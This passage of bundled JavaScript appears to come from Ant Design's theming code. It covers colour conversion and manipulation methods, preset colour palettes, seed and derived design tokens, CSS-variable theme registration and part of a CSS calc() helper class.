        var a = rgbToHsv(this.r, this.g, this.b);
        return { h: a.h * 360, s: a.s, v: a.v, a: this.a };
      }),
      (i.prototype.toHsvString = function () {
        var a = rgbToHsv(this.r, this.g, this.b),
          o = Math.round(a.h * 360),
          s = Math.round(a.s * 100),
          tt = Math.round(a.v * 100);
        return this.a === 1
          ? "hsv(".concat(o, ", ").concat(s, "%, ").concat(tt, "%)")
          : "hsva("
              .concat(o, ", ")
              .concat(s, "%, ")
              .concat(tt, "%, ")
              .concat(this.roundA, ")");
      }),
      (i.prototype.toHsl = function () {
        var a = rgbToHsl(this.r, this.g, this.b);
        return { h: a.h * 360, s: a.s, l: a.l, a: this.a };
      }),
      (i.prototype.toHslString = function () {
        var a = rgbToHsl(this.r, this.g, this.b),
          o = Math.round(a.h * 360),
          s = Math.round(a.s * 100),
          tt = Math.round(a.l * 100);
        return this.a === 1
          ? "hsl(".concat(o, ", ").concat(s, "%, ").concat(tt, "%)")
          : "hsla("
              .concat(o, ", ")
              .concat(s, "%, ")
              .concat(tt, "%, ")
              .concat(this.roundA, ")");
      }),
      (i.prototype.toHex = function (a) {
        return a === void 0 && (a = !1), rgbToHex(this.r, this.g, this.b, a);
      }),
      (i.prototype.toHexString = function (a) {
        return a === void 0 && (a = !1), "#" + this.toHex(a);
      }),
      (i.prototype.toHex8 = function (a) {
        return (
          a === void 0 && (a = !1), rgbaToHex(this.r, this.g, this.b, this.a, a)
        );
      }),
      (i.prototype.toHex8String = function (a) {
        return a === void 0 && (a = !1), "#" + this.toHex8(a);
      }),
      (i.prototype.toHexShortString = function (a) {
        return (
          a === void 0 && (a = !1),
          this.a === 1 ? this.toHexString(a) : this.toHex8String(a)
        );
      }),
      (i.prototype.toRgb = function () {
        return {
          r: Math.round(this.r),
          g: Math.round(this.g),
          b: Math.round(this.b),
          a: this.a,
        };
      }),
      (i.prototype.toRgbString = function () {
        var a = Math.round(this.r),
          o = Math.round(this.g),
          s = Math.round(this.b);
        return this.a === 1
          ? "rgb(".concat(a, ", ").concat(o, ", ").concat(s, ")")
          : "rgba("
              .concat(a, ", ")
              .concat(o, ", ")
              .concat(s, ", ")
              .concat(this.roundA, ")");
      }),
      (i.prototype.toPercentageRgb = function () {
        var a = function (o) {
          return "".concat(Math.round(bound01(o, 255) * 100), "%");
        };
        return { r: a(this.r), g: a(this.g), b: a(this.b), a: this.a };
      }),
      (i.prototype.toPercentageRgbString = function () {
        var a = function (o) {
          return Math.round(bound01(o, 255) * 100);
        };
        return this.a === 1
          ? "rgb("
              .concat(a(this.r), "%, ")
              .concat(a(this.g), "%, ")
              .concat(a(this.b), "%)")
          : "rgba("
              .concat(a(this.r), "%, ")
              .concat(a(this.g), "%, ")
              .concat(a(this.b), "%, ")
              .concat(this.roundA, ")");
      }),
      (i.prototype.toName = function () {
        if (this.a === 0) return "transparent";
        if (this.a < 1) return !1;
        for (
          var a = "#" + rgbToHex(this.r, this.g, this.b, !1),
            o = 0,
            s = Object.entries(names);
          o < s.length;
          o++
        ) {
          var tt = s[o],
            nt = tt[0],
            ot = tt[1];
          if (a === ot) return nt;
        }
        return !1;
      }),
      (i.prototype.toString = function (a) {
        var o = !!a;
        a = a ?? this.format;
        var s = !1,
          tt = this.a < 1 && this.a >= 0,
          nt = !o && tt && (a.startsWith("hex") || a === "name");
        return nt
          ? a === "name" && this.a === 0
            ? this.toName()
            : this.toRgbString()
          : (a === "rgb" && (s = this.toRgbString()),
            a === "prgb" && (s = this.toPercentageRgbString()),
            (a === "hex" || a === "hex6") && (s = this.toHexString()),
            a === "hex3" && (s = this.toHexString(!0)),
            a === "hex4" && (s = this.toHex8String(!0)),
            a === "hex8" && (s = this.toHex8String()),
            a === "name" && (s = this.toName()),
            a === "hsl" && (s = this.toHslString()),
            a === "hsv" && (s = this.toHsvString()),
            s || this.toHexString());
      }),
      (i.prototype.toNumber = function () {
        return (
          (Math.round(this.r) << 16) +
          (Math.round(this.g) << 8) +
          Math.round(this.b)
        );
      }),
      (i.prototype.clone = function () {
        return new i(this.toString());
      }),
      (i.prototype.lighten = function (a) {
        a === void 0 && (a = 10);
        var o = this.toHsl();
        return (o.l += a / 100), (o.l = clamp01(o.l)), new i(o);
      }),
      (i.prototype.brighten = function (a) {
        a === void 0 && (a = 10);
        var o = this.toRgb();
        return (
          (o.r = Math.max(
            0,
            Math.min(255, o.r - Math.round(255 * -(a / 100)))
          )),
          (o.g = Math.max(
            0,
            Math.min(255, o.g - Math.round(255 * -(a / 100)))
          )),
          (o.b = Math.max(
            0,
            Math.min(255, o.b - Math.round(255 * -(a / 100)))
          )),
          new i(o)
        );
      }),
      (i.prototype.darken = function (a) {
        a === void 0 && (a = 10);
        var o = this.toHsl();
        return (o.l -= a / 100), (o.l = clamp01(o.l)), new i(o);
      }),
      (i.prototype.tint = function (a) {
        return a === void 0 && (a = 10), this.mix("white", a);
      }),
      (i.prototype.shade = function (a) {
        return a === void 0 && (a = 10), this.mix("black", a);
      }),
      (i.prototype.desaturate = function (a) {
        a === void 0 && (a = 10);
        var o = this.toHsl();
        return (o.s -= a / 100), (o.s = clamp01(o.s)), new i(o);
      }),
      (i.prototype.saturate = function (a) {
        a === void 0 && (a = 10);
        var o = this.toHsl();
        return (o.s += a / 100), (o.s = clamp01(o.s)), new i(o);
      }),
      (i.prototype.greyscale = function () {
        return this.desaturate(100);
      }),
      (i.prototype.spin = function (a) {
        var o = this.toHsl(),
          s = (o.h + a) % 360;
        return (o.h = s < 0 ? 360 + s : s), new i(o);
      }),
      (i.prototype.mix = function (a, o) {
        o === void 0 && (o = 50);
        var s = this.toRgb(),
          tt = new i(a).toRgb(),
          nt = o / 100,
          ot = {
            r: (tt.r - s.r) * nt + s.r,
            g: (tt.g - s.g) * nt + s.g,
            b: (tt.b - s.b) * nt + s.b,
            a: (tt.a - s.a) * nt + s.a,
          };
        return new i(ot);
      }),
      (i.prototype.analogous = function (a, o) {
        a === void 0 && (a = 6), o === void 0 && (o = 30);
        var s = this.toHsl(),
          tt = 360 / o,
          nt = [this];
        for (s.h = (s.h - ((tt * a) >> 1) + 720) % 360; --a; )
          (s.h = (s.h + tt) % 360), nt.push(new i(s));
        return nt;
      }),
      (i.prototype.complement = function () {
        var a = this.toHsl();
        return (a.h = (a.h + 180) % 360), new i(a);
      }),
      (i.prototype.monochromatic = function (a) {
        a === void 0 && (a = 6);
        for (
          var o = this.toHsv(),
            s = o.h,
            tt = o.s,
            nt = o.v,
            ot = [],
            st = 1 / a;
          a--;

        )
          ot.push(new i({ h: s, s: tt, v: nt })), (nt = (nt + st) % 1);
        return ot;
      }),
      (i.prototype.splitcomplement = function () {
        var a = this.toHsl(),
          o = a.h;
        return [
          this,
          new i({ h: (o + 72) % 360, s: a.s, l: a.l }),
          new i({ h: (o + 216) % 360, s: a.s, l: a.l }),
        ];
      }),
      (i.prototype.onBackground = function (a) {
        var o = this.toRgb(),
          s = new i(a).toRgb(),
          tt = o.a + s.a * (1 - o.a);
        return new i({
          r: (o.r * o.a + s.r * s.a * (1 - o.a)) / tt,
          g: (o.g * o.a + s.g * s.a * (1 - o.a)) / tt,
          b: (o.b * o.a + s.b * s.a * (1 - o.a)) / tt,
          a: tt,
        });
      }),
      (i.prototype.triad = function () {
        return this.polyad(3);
      }),
      (i.prototype.tetrad = function () {
        return this.polyad(4);
      }),
      (i.prototype.polyad = function (a) {
        for (
          var o = this.toHsl(), s = o.h, tt = [this], nt = 360 / a, ot = 1;
          ot < a;
          ot++
        )
          tt.push(new i({ h: (s + ot * nt) % 360, s: o.s, l: o.l }));
        return tt;
      }),
      (i.prototype.equals = function (a) {
        return this.toRgbString() === new i(a).toRgbString();
      }),
      i
    );
  })(),
  hueStep = 2,
  saturationStep = 0.16,
  saturationStep2 = 0.05,
  brightnessStep1 = 0.05,
  brightnessStep2 = 0.15,
  lightColorCount = 5,
  darkColorCount = 4,
  darkColorMap = [
    { index: 7, opacity: 0.15 },
    { index: 6, opacity: 0.25 },
    { index: 5, opacity: 0.3 },
    { index: 5, opacity: 0.45 },
    { index: 5, opacity: 0.65 },
    { index: 5, opacity: 0.85 },
    { index: 4, opacity: 0.9 },
    { index: 3, opacity: 0.95 },
    { index: 2, opacity: 0.97 },
    { index: 1, opacity: 0.98 },
  ];
function toHsv(i) {
  var a = i.r,
    o = i.g,
    s = i.b,
    tt = rgbToHsv(a, o, s);
  return { h: tt.h * 360, s: tt.s, v: tt.v };
}
function toHex(i) {
  var a = i.r,
    o = i.g,
    s = i.b;
  return "#".concat(rgbToHex(a, o, s, !1));
}
function mix(i, a, o) {
  var s = o / 100,
    tt = {
      r: (a.r - i.r) * s + i.r,
      g: (a.g - i.g) * s + i.g,
      b: (a.b - i.b) * s + i.b,
    };
  return tt;
}
function getHue(i, a, o) {
  var s;
  return (
    Math.round(i.h) >= 60 && Math.round(i.h) <= 240
      ? (s = o ? Math.round(i.h) - hueStep * a : Math.round(i.h) + hueStep * a)
      : (s = o ? Math.round(i.h) + hueStep * a : Math.round(i.h) - hueStep * a),
    s < 0 ? (s += 360) : s >= 360 && (s -= 360),
    s
  );
}
function getSaturation(i, a, o) {
  if (i.h === 0 && i.s === 0) return i.s;
  var s;
  return (
    o
      ? (s = i.s - saturationStep * a)
      : a === darkColorCount
      ? (s = i.s + saturationStep)
      : (s = i.s + saturationStep2 * a),
    s > 1 && (s = 1),
    o && a === lightColorCount && s > 0.1 && (s = 0.1),
    s < 0.06 && (s = 0.06),
    Number(s.toFixed(2))
  );
}
function getValue$1(i, a, o) {
  var s;
  return (
    o ? (s = i.v + brightnessStep1 * a) : (s = i.v - brightnessStep2 * a),
    s > 1 && (s = 1),
    Number(s.toFixed(2))
  );
}
function generate$1(i) {
  for (
    var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
      o = [],
      s = inputToRGB(i),
      tt = lightColorCount;
    tt > 0;
    tt -= 1
  ) {
    var nt = toHsv(s),
      ot = toHex(
        inputToRGB({
          h: getHue(nt, tt, !0),
          s: getSaturation(nt, tt, !0),
          v: getValue$1(nt, tt, !0),
        })
      );
    o.push(ot);
  }
  o.push(toHex(s));
  for (var st = 1; st <= darkColorCount; st += 1) {
    var ft = toHsv(s),
      ht = toHex(
        inputToRGB({
          h: getHue(ft, st),
          s: getSaturation(ft, st),
          v: getValue$1(ft, st),
        })
      );
    o.push(ht);
  }
  return a.theme === "dark"
    ? darkColorMap.map(function (gt) {
        var St = gt.index,
          vt = gt.opacity,
          _t = toHex(
            mix(
              inputToRGB(a.backgroundColor || "#141414"),
              inputToRGB(o[St]),
              vt * 100
            )
          );
        return _t;
      })
    : o;
}
var presetPrimaryColors = {
    red: "#F5222D",
    volcano: "#FA541C",
    orange: "#FA8C16",
    gold: "#FAAD14",
    yellow: "#FADB14",
    lime: "#A0D911",
    green: "#52C41A",
    cyan: "#13C2C2",
    blue: "#1677FF",
    geekblue: "#2F54EB",
    purple: "#722ED1",
    magenta: "#EB2F96",
    grey: "#666666",
  },
  red = [
    "#fff1f0",
    "#ffccc7",
    "#ffa39e",
    "#ff7875",
    "#ff4d4f",
    "#f5222d",
    "#cf1322",
    "#a8071a",
    "#820014",
    "#5c0011",
  ];
red.primary = red[5];
var volcano = [
  "#fff2e8",
  "#ffd8bf",
  "#ffbb96",
  "#ff9c6e",
  "#ff7a45",
  "#fa541c",
  "#d4380d",
  "#ad2102",
  "#871400",
  "#610b00",
];
volcano.primary = volcano[5];
var orange = [
  "#fff7e6",
  "#ffe7ba",
  "#ffd591",
  "#ffc069",
  "#ffa940",
  "#fa8c16",
  "#d46b08",
  "#ad4e00",
  "#873800",
  "#612500",
];
orange.primary = orange[5];
var gold = [
  "#fffbe6",
  "#fff1b8",
  "#ffe58f",
  "#ffd666",
  "#ffc53d",
  "#faad14",
  "#d48806",
  "#ad6800",
  "#874d00",
  "#613400",
];
gold.primary = gold[5];
var yellow = [
  "#feffe6",
  "#ffffb8",
  "#fffb8f",
  "#fff566",
  "#ffec3d",
  "#fadb14",
  "#d4b106",
  "#ad8b00",
  "#876800",
  "#614700",
];
yellow.primary = yellow[5];
var lime = [
  "#fcffe6",
  "#f4ffb8",
  "#eaff8f",
  "#d3f261",
  "#bae637",
  "#a0d911",
  "#7cb305",
  "#5b8c00",
  "#3f6600",
  "#254000",
];
lime.primary = lime[5];
var green = [
  "#f6ffed",
  "#d9f7be",
  "#b7eb8f",
  "#95de64",
  "#73d13d",
  "#52c41a",
  "#389e0d",
  "#237804",
  "#135200",
  "#092b00",
];
green.primary = green[5];
var cyan = [
  "#e6fffb",
  "#b5f5ec",
  "#87e8de",
  "#5cdbd3",
  "#36cfc9",
  "#13c2c2",
  "#08979c",
  "#006d75",
  "#00474f",
  "#002329",
];
cyan.primary = cyan[5];
var blue = [
  "#e6f4ff",
  "#bae0ff",
  "#91caff",
  "#69b1ff",
  "#4096ff",
  "#1677ff",
  "#0958d9",
  "#003eb3",
  "#002c8c",
  "#001d66",
];
blue.primary = blue[5];
var geekblue = [
  "#f0f5ff",
  "#d6e4ff",
  "#adc6ff",
  "#85a5ff",
  "#597ef7",
  "#2f54eb",
  "#1d39c4",
  "#10239e",
  "#061178",
  "#030852",
];
geekblue.primary = geekblue[5];
var purple = [
  "#f9f0ff",
  "#efdbff",
  "#d3adf7",
  "#b37feb",
  "#9254de",
  "#722ed1",
  "#531dab",
  "#391085",
  "#22075e",
  "#120338",
];
purple.primary = purple[5];
var magenta = [
  "#fff0f6",
  "#ffd6e7",
  "#ffadd2",
  "#ff85c0",
  "#f759ab",
  "#eb2f96",
  "#c41d7f",
  "#9e1068",
  "#780650",
  "#520339",
];
magenta.primary = magenta[5];
var grey = [
  "#a6a6a6",
  "#999999",
  "#8c8c8c",
  "#808080",
  "#737373",
  "#666666",
  "#404040",
  "#1a1a1a",
  "#000000",
  "#000000",
];
grey.primary = grey[5];
var presetPalettes = {
  red,
  volcano,
  orange,
  gold,
  yellow,
  lime,
  green,
  cyan,
  blue,
  geekblue,
  purple,
  magenta,
  grey,
};
const defaultPresetColors = {
    blue: "#1677FF",
    purple: "#722ED1",
    cyan: "#13C2C2",
    green: "#52C41A",
    magenta: "#EB2F96",
    pink: "#EB2F96",
    red: "#F5222D",
    orange: "#FA8C16",
    yellow: "#FADB14",
    volcano: "#FA541C",
    geekblue: "#2F54EB",
    gold: "#FAAD14",
    lime: "#A0D911",
  },
  seedToken = Object.assign(Object.assign({}, defaultPresetColors), {
    colorPrimary: "#1677ff",
    colorSuccess: "#52c41a",
    colorWarning: "#faad14",
    colorError: "#ff4d4f",
    colorInfo: "#1677ff",
    colorLink: "",
    colorTextBase: "",
    colorBgBase: "",
    fontFamily: `-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial,
'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol',
'Noto Color Emoji'`,
    fontFamilyCode:
      "'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace",
    fontSize: 14,
    lineWidth: 1,
    lineType: "solid",
    motionUnit: 0.1,
    motionBase: 0,
    motionEaseOutCirc: "cubic-bezier(0.08, 0.82, 0.17, 1)",
    motionEaseInOutCirc: "cubic-bezier(0.78, 0.14, 0.15, 0.86)",
    motionEaseOut: "cubic-bezier(0.215, 0.61, 0.355, 1)",
    motionEaseInOut: "cubic-bezier(0.645, 0.045, 0.355, 1)",
    motionEaseOutBack: "cubic-bezier(0.12, 0.4, 0.29, 1.46)",
    motionEaseInBack: "cubic-bezier(0.71, -0.46, 0.88, 0.6)",
    motionEaseInQuint: "cubic-bezier(0.755, 0.05, 0.855, 0.06)",
    motionEaseOutQuint: "cubic-bezier(0.23, 1, 0.32, 1)",
    borderRadius: 6,
    sizeUnit: 4,
    sizeStep: 4,
    sizePopupArrow: 16,
    controlHeight: 32,
    zIndexBase: 0,
    zIndexPopupBase: 1e3,
    opacityImage: 1,
    wireframe: !1,
    motion: !0,
  });
function genColorMapToken(i, a) {
  let { generateColorPalettes: o, generateNeutralColorPalettes: s } = a;
  const {
      colorSuccess: tt,
      colorWarning: nt,
      colorError: ot,
      colorInfo: st,
      colorPrimary: ft,
      colorBgBase: ht,
      colorTextBase: gt,
    } = i,
    St = o(ft),
    vt = o(tt),
    _t = o(nt),
    Et = o(ot),
    Ct = o(st),
    Pt = s(ht, gt),
    bt = i.colorLink || i.colorInfo,
    xt = o(bt),
    yt = new TinyColor(Et[1]).mix(new TinyColor(Et[3]), 50).toHexString();
  return Object.assign(Object.assign({}, Pt), {
    colorPrimaryBg: St[1],
    colorPrimaryBgHover: St[2],
    colorPrimaryBorder: St[3],
    colorPrimaryBorderHover: St[4],
    colorPrimaryHover: St[5],
    colorPrimary: St[6],
    colorPrimaryActive: St[7],
    colorPrimaryTextHover: St[8],
    colorPrimaryText: St[9],
    colorPrimaryTextActive: St[10],
    colorSuccessBg: vt[1],
    colorSuccessBgHover: vt[2],
    colorSuccessBorder: vt[3],
    colorSuccessBorderHover: vt[4],
    colorSuccessHover: vt[4],
    colorSuccess: vt[6],
    colorSuccessActive: vt[7],
    colorSuccessTextHover: vt[8],
    colorSuccessText: vt[9],
    colorSuccessTextActive: vt[10],
    colorErrorBg: Et[1],
    colorErrorBgHover: Et[2],
    colorErrorBgFilledHover: yt,
    colorErrorBgActive: Et[3],
    colorErrorBorder: Et[3],
    colorErrorBorderHover: Et[4],
    colorErrorHover: Et[5],
    colorError: Et[6],
    colorErrorActive: Et[7],
    colorErrorTextHover: Et[8],
    colorErrorText: Et[9],
    colorErrorTextActive: Et[10],
    colorWarningBg: _t[1],
    colorWarningBgHover: _t[2],
    colorWarningBorder: _t[3],
    colorWarningBorderHover: _t[4],
    colorWarningHover: _t[4],
    colorWarning: _t[6],
    colorWarningActive: _t[7],
    colorWarningTextHover: _t[8],
    colorWarningText: _t[9],
    colorWarningTextActive: _t[10],
    colorInfoBg: Ct[1],
    colorInfoBgHover: Ct[2],
    colorInfoBorder: Ct[3],
    colorInfoBorderHover: Ct[4],
    colorInfoHover: Ct[4],
    colorInfo: Ct[6],
    colorInfoActive: Ct[7],
    colorInfoTextHover: Ct[8],
    colorInfoText: Ct[9],
    colorInfoTextActive: Ct[10],
    colorLinkHover: xt[4],
    colorLink: xt[6],
    colorLinkActive: xt[7],
    colorBgMask: new TinyColor("#000").setAlpha(0.45).toRgbString(),
    colorWhite: "#fff",
  });
}
const genRadius = (i) => {
  let a = i,
    o = i,
    s = i,
    tt = i;
  return (
    i < 6 && i >= 5
      ? (a = i + 1)
      : i < 16 && i >= 6
      ? (a = i + 2)
      : i >= 16 && (a = 16),
    i < 7 && i >= 5
      ? (o = 4)
      : i < 8 && i >= 7
      ? (o = 5)
      : i < 14 && i >= 8
      ? (o = 6)
      : i < 16 && i >= 14
      ? (o = 7)
      : i >= 16 && (o = 8),
    i < 6 && i >= 2 ? (s = 1) : i >= 6 && (s = 2),
    i > 4 && i < 8 ? (tt = 4) : i >= 8 && (tt = 6),
    {
      borderRadius: i,
      borderRadiusXS: s,
      borderRadiusSM: o,
      borderRadiusLG: a,
      borderRadiusOuter: tt,
    }
  );
};
function genCommonMapToken(i) {
  const { motionUnit: a, motionBase: o, borderRadius: s, lineWidth: tt } = i;
  return Object.assign(
    {
      motionDurationFast: `${(o + a).toFixed(1)}s`,
      motionDurationMid: `${(o + a * 2).toFixed(1)}s`,
      motionDurationSlow: `${(o + a * 3).toFixed(1)}s`,
      lineWidthBold: tt + 1,
    },
    genRadius(s)
  );
}
const genControlHeight = (i) => {
  const { controlHeight: a } = i;
  return {
    controlHeightSM: a * 0.75,
    controlHeightXS: a * 0.5,
    controlHeightLG: a * 1.25,
  };
};
function getLineHeight(i) {
  return (i + 8) / i;
}
function getFontSizes(i) {
  const a = new Array(10).fill(null).map((o, s) => {
    const tt = s - 1,
      nt = i * Math.pow(Math.E, tt / 5),
      ot = s > 1 ? Math.floor(nt) : Math.ceil(nt);
    return Math.floor(ot / 2) * 2;
  });
  return (a[1] = i), a.map((o) => ({ size: o, lineHeight: getLineHeight(o) }));
}
const genFontMapToken = (i) => {
  const a = getFontSizes(i),
    o = a.map((gt) => gt.size),
    s = a.map((gt) => gt.lineHeight),
    tt = o[1],
    nt = o[0],
    ot = o[2],
    st = s[1],
    ft = s[0],
    ht = s[2];
  return {
    fontSizeSM: nt,
    fontSize: tt,
    fontSizeLG: ot,
    fontSizeXL: o[3],
    fontSizeHeading1: o[6],
    fontSizeHeading2: o[5],
    fontSizeHeading3: o[4],
    fontSizeHeading4: o[3],
    fontSizeHeading5: o[2],
    lineHeight: st,
    lineHeightLG: ht,
    lineHeightSM: ft,
    fontHeight: Math.round(st * tt),
    fontHeightLG: Math.round(ht * ot),
    fontHeightSM: Math.round(ft * nt),
    lineHeightHeading1: s[6],
    lineHeightHeading2: s[5],
    lineHeightHeading3: s[4],
    lineHeightHeading4: s[3],
    lineHeightHeading5: s[2],
  };
};
function genSizeMapToken(i) {
  const { sizeUnit: a, sizeStep: o } = i;
  return {
    sizeXXL: a * (o + 8),
    sizeXL: a * (o + 4),
    sizeLG: a * (o + 2),
    sizeMD: a * (o + 1),
    sizeMS: a * o,
    size: a * o,
    sizeSM: a * (o - 1),
    sizeXS: a * (o - 2),
    sizeXXS: a * (o - 3),
  };
}
const getAlphaColor$1 = (i, a) => new TinyColor(i).setAlpha(a).toRgbString(),
  getSolidColor = (i, a) => new TinyColor(i).darken(a).toHexString(),
  generateColorPalettes = (i) => {
    const a = generate$1(i);
    return {
      1: a[0],
      2: a[1],
      3: a[2],
      4: a[3],
      5: a[4],
      6: a[5],
      7: a[6],
      8: a[4],
      9: a[5],
      10: a[6],
    };
  },
  generateNeutralColorPalettes = (i, a) => {
    const o = i || "#fff",
      s = a || "#000";
    return {
      colorBgBase: o,
      colorTextBase: s,
      colorText: getAlphaColor$1(s, 0.88),
      colorTextSecondary: getAlphaColor$1(s, 0.65),
      colorTextTertiary: getAlphaColor$1(s, 0.45),
      colorTextQuaternary: getAlphaColor$1(s, 0.25),
      colorFill: getAlphaColor$1(s, 0.15),
      colorFillSecondary: getAlphaColor$1(s, 0.06),
      colorFillTertiary: getAlphaColor$1(s, 0.04),
      colorFillQuaternary: getAlphaColor$1(s, 0.02),
      colorBgSolid: getAlphaColor$1(s, 1),
      colorBgSolidHover: getAlphaColor$1(s, 0.75),
      colorBgSolidActive: getAlphaColor$1(s, 0.95),
      colorBgLayout: getSolidColor(o, 4),
      colorBgContainer: getSolidColor(o, 0),
      colorBgElevated: getSolidColor(o, 0),
      colorBgSpotlight: getAlphaColor$1(s, 0.85),
      colorBgBlur: "transparent",
      colorBorder: getSolidColor(o, 15),
      colorBorderSecondary: getSolidColor(o, 6),
    };
  };
function derivative(i) {
  (presetPrimaryColors.pink = presetPrimaryColors.magenta),
    (presetPalettes.pink = presetPalettes.magenta);
  const a = Object.keys(defaultPresetColors)
    .map((o) => {
      const s =
        i[o] === presetPrimaryColors[o] ? presetPalettes[o] : generate$1(i[o]);
      return new Array(10)
        .fill(1)
        .reduce(
          (tt, nt, ot) => (
            (tt[`${o}-${ot + 1}`] = s[ot]), (tt[`${o}${ot + 1}`] = s[ot]), tt
          ),
          {}
        );
    })
    .reduce((o, s) => ((o = Object.assign(Object.assign({}, o), s)), o), {});
  return Object.assign(
    Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(Object.assign({}, i), a),
            genColorMapToken(i, {
              generateColorPalettes,
              generateNeutralColorPalettes,
            })
          ),
          genFontMapToken(i.fontSize)
        ),
        genSizeMapToken(i)
      ),
      genControlHeight(i)
    ),
    genCommonMapToken(i)
  );
}
const defaultTheme = createTheme(derivative),
  defaultConfig = {
    token: seedToken,
    override: { override: seedToken },
    hashed: !0,
  },
  DesignTokenContext = React$1.createContext(defaultConfig),
  defaultPrefixCls = "ant",
  defaultIconPrefixCls = "anticon",
  Variants = ["outlined", "borderless", "filled"],
  defaultGetPrefixCls = (i, a) =>
    a || (i ? `${defaultPrefixCls}-${i}` : defaultPrefixCls),
  ConfigContext = reactExports.createContext({
    getPrefixCls: defaultGetPrefixCls,
    iconPrefixCls: defaultIconPrefixCls,
  }),
  dynamicStyleMark = `-ant-${Date.now()}-${Math.random()}`;
function getStyle(i, a) {
  const o = {},
    s = (ot, st) => {
      let ft = ot.clone();
      return (ft = (st == null ? void 0 : st(ft)) || ft), ft.toRgbString();
    },
    tt = (ot, st) => {
      const ft = new TinyColor(ot),
        ht = generate$1(ft.toRgbString());
      (o[`${st}-color`] = s(ft)),
        (o[`${st}-color-disabled`] = ht[1]),
        (o[`${st}-color-hover`] = ht[4]),
        (o[`${st}-color-active`] = ht[6]),
        (o[`${st}-color-outline`] = ft.clone().setAlpha(0.2).toRgbString()),
        (o[`${st}-color-deprecated-bg`] = ht[0]),
        (o[`${st}-color-deprecated-border`] = ht[2]);
    };
  if (a.primaryColor) {
    tt(a.primaryColor, "primary");
    const ot = new TinyColor(a.primaryColor),
      st = generate$1(ot.toRgbString());
    st.forEach((ht, gt) => {
      o[`primary-${gt + 1}`] = ht;
    }),
      (o["primary-color-deprecated-l-35"] = s(ot, (ht) => ht.lighten(35))),
      (o["primary-color-deprecated-l-20"] = s(ot, (ht) => ht.lighten(20))),
      (o["primary-color-deprecated-t-20"] = s(ot, (ht) => ht.tint(20))),
      (o["primary-color-deprecated-t-50"] = s(ot, (ht) => ht.tint(50))),
      (o["primary-color-deprecated-f-12"] = s(ot, (ht) =>
        ht.setAlpha(ht.getAlpha() * 0.12)
      ));
    const ft = new TinyColor(st[0]);
    (o["primary-color-active-deprecated-f-30"] = s(ft, (ht) =>
      ht.setAlpha(ht.getAlpha() * 0.3)
    )),
      (o["primary-color-active-deprecated-d-02"] = s(ft, (ht) => ht.darken(2)));
  }
  return (
    a.successColor && tt(a.successColor, "success"),
    a.warningColor && tt(a.warningColor, "warning"),
    a.errorColor && tt(a.errorColor, "error"),
    a.infoColor && tt(a.infoColor, "info"),
    `
  :root {
    ${Object.keys(o).map((ot) => `--${i}-${ot}: ${o[ot]};`).join(`
`)}
  }
  `.trim()
  );
}
function registerTheme(i, a) {
  const o = getStyle(i, a);
  canUseDom() && updateCSS(o, `${dynamicStyleMark}-dynamic-theme`);
}
const DisabledContext = reactExports.createContext(!1),
  DisabledContextProvider = (i) => {
    let { children: a, disabled: o } = i;
    const s = reactExports.useContext(DisabledContext);
    return reactExports.createElement(
      DisabledContext.Provider,
      { value: o ?? s },
      a
    );
  },
  SizeContext = reactExports.createContext(void 0),
  SizeContextProvider = (i) => {
    let { children: a, size: o } = i;
    const s = reactExports.useContext(SizeContext);
    return reactExports.createElement(
      SizeContext.Provider,
      { value: o || s },
      a
    );
  };
function useConfig() {
  const i = reactExports.useContext(DisabledContext),
    a = reactExports.useContext(SizeContext);
  return { componentDisabled: i, componentSize: a };
}
var AbstractCalculator = _createClass(function i() {
    _classCallCheck(this, i);
  }),
  CALC_UNIT = "CALC_UNIT",
  regexp$1 = new RegExp(CALC_UNIT, "g");
function unit(i) {
  return typeof i == "number" ? "".concat(i).concat(CALC_UNIT) : i;
}
var CSSCalculator = (function (i) {
    _inherits(o, i);
    var a = _createSuper(o);
    function o(s, tt) {
      var nt;
      _classCallCheck(this, o),
        (nt = a.call(this)),
        _defineProperty$1(_assertThisInitialized(nt), "result", ""),
        _defineProperty$1(_assertThisInitialized(nt), "unitlessCssVar", void 0),
        _defineProperty$1(_assertThisInitialized(nt), "lowPriority", void 0);
      var ot = _typeof(s);
      return (
        (nt.unitlessCssVar = tt),
        s instanceof o
          ? (nt.result = "(".concat(s.result, ")"))
          : ot === "number"
          ? (nt.result = unit(s))
          : ot === "string" && (nt.result = s),
        nt
      );
    }
    return (
      _createClass(o, [
        {
          key: "add",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result = ""
                    .concat(this.result, " + ")
                    .concat(tt.getResult()))
                : (typeof tt == "number" || typeof tt == "string") &&
                  (this.result = ""
                    .concat(this.result, " + ")
                    .concat(unit(tt))),
              (this.lowPriority = !0),
              this
            );
          },
        },
        {
          key: "sub",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result = ""
                    .concat(this.result, " - ")
                    .concat(tt.getResult()))
                : (typeof tt == "number" || typeof tt == "string") &&
                  (this.result = ""
                    .concat(this.result, " - ")
                    .concat(unit(tt))),
              (this.lowPriority = !0),
              this
            );
          },
        },
        {
          key: "mul",
          value: function (tt) {
            return (
              this.lowPriority && (this.result = "(".concat(this.result, ")")),
              tt instanceof o
                ? (this.result = ""
                    .concat(this.result, " * ")
                    .concat(tt.getResult(!0)))
                : (typeof tt == "number" || typeof tt == "string") &&
                  (this.result = "".concat(this.result, " * ").concat(tt)),
              (this.lowPriority = !1),
              this
            );
          },
        },
        {
          key: "div",
          value: function (tt) {
            return (
              this.lowPriority && (this.result = "(".concat(this.result, ")")),
              tt instanceof o
                ? (this.result = ""
                    .concat(this.result, " / ")
                    .concat(tt.getResult(!0)))
                : (typeof tt == "number" || typeof tt == "string") &&
                  (this.result = "".concat(this.result, " / ").concat(tt)),
              (this.lowPriority = !1),
              this
            );
          },
        },
        {
          key: "getResult",
          value: function (tt) {
            return this.lowPriority || tt
              ? "(".concat(this.result, ")")
              : this.result;
          },
        },
        {
          key: "equal",
          value: function (tt) {
            var nt = this,
              ot = tt || {},
              st = ot.unit,
              ft = !0;
            return (
              typeof st == "boolean"
                ? (ft = st)
                : Array.from(this.unitlessCssVar).some(function (ht) {
                    return nt.result.includes(ht);
                  }) && (ft = !1),
              (this.result = this.result.replace(regexp$1, ft ? "px" : "")),
              typeof this.lowPriority < "u"
                ? "calc(".concat(this.result, ")")
                : this.result
            );
          },
        },
      ]),
      o
    );
